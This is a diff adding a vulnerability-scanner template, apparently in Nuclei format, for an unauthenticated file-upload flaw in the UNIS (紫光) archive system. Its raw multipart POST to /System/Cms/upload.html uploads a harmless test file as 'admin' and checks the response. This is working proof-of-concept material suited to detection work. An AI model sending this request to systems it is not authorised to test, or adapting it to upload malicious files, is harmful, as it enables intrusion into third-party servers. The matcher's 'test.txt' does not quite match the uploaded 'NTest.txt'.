@@ -1,0 +1,52 @@
+id: unis-archive-file-upload
+
+info:
+  name: "紫光档案系统 upload 接口文件上传未授权漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    该漏洞允许攻击者通过构造特定路径访问上传的文件，例如：http://127.0.0.1:80/uploads/company1/fonds1/cms/20230919/UNIS-4eNGCaBibaHch8O8Yrc9e6nOB.txt
+      漏洞披露日期：2023-12-04
+  tags: 紫光档案系统
+
+http:
+- raw:
+  - |
+    POST /System/Cms/upload.html?token= HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
+    Connection: close
+    Accept: application/json, text/javascript, */*; q=0.01
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3enKbCUwg60aGZcr
+
+    ------WebKitFormBoundary3enKbCUwg60aGZcr
+    Content-Disposition: form-data; name="userID"
+
+    admin
+    ------WebKitFormBoundary3enKbCUwg60aGZcr
+    Content-Disposition: form-data; name="fondsid"
+
+    1
+    ------WebKitFormBoundary3enKbCUwg60aGZcr
+    Content-Disposition: form-data; name="comid"
+
+    1
+    ------WebKitFormBoundary3enKbCUwg60aGZcr
+    Content-Disposition: form-data; name="token"
+
+    1
+    ------WebKitFormBoundary3enKbCUwg60aGZcr
+    Content-Disposition: form-data; name="files[]"; filename="NTest.txt"
+
+    NdayTest
+    ------WebKitFormBoundary3enKbCUwg60aGZcr--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'test.txt'
